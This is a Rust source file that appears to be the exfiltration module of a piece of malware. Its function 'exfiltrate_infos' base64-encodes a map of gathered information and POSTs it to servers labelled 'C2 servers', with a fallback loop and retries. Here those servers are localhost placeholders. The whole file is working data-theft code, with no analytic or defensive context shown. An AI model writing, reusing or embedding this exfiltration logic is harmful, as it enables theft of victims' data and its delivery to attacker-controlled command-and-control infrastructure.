use base64::{engine::general_purpose, Engine as _};
use rand::{distributions::Alphanumeric, Rng};
use std::collections::HashMap;
use std::io::Write;
use reqwest::blocking::Client;
pub fn exfiltrate_infos(infos: HashMap<String, String>) -> Result<(), &'static str> {
    // serialize the hashmap and base64 it
    let serialized_infos =
        general_purpose::STANDARD_NO_PAD.encode(serde_json::to_string(&infos).unwrap());
    let servers = vec!["http://127.0.0.1:8000/php/upload_data_654165.php", "http://127.0.0.1:8001/php/upload_data_654165.php    "]; // C2 servers
    let mut curr_try = 0;
    let mut fail_count = 0;
    loop {
        // send the serialized infos to the server
        match send_as_text(servers[curr_try], &serialized_infos) {
            Ok(_) => {
                println!("Successfully sent the infos to the server");
                break;
            }
            Err(_) => {
                fail_count += 1;
                if fail_count == servers.len() {
                    return Err("All servers failed");
                }
                std::thread::sleep(std::time::Duration::from_secs(5));
            }
        }
        curr_try = (curr_try + 1) % servers.len();
    }
    Ok(())
}
pub fn send_as_text(url: &str, data: &String) -> Result<reqwest::blocking::Response, reqwest::Error> {
    let client = reqwest::blocking::Client::new();
    let res = client.post(url).body(data.clone()).send();
    println!("Result: {:?}", res);
    return res
}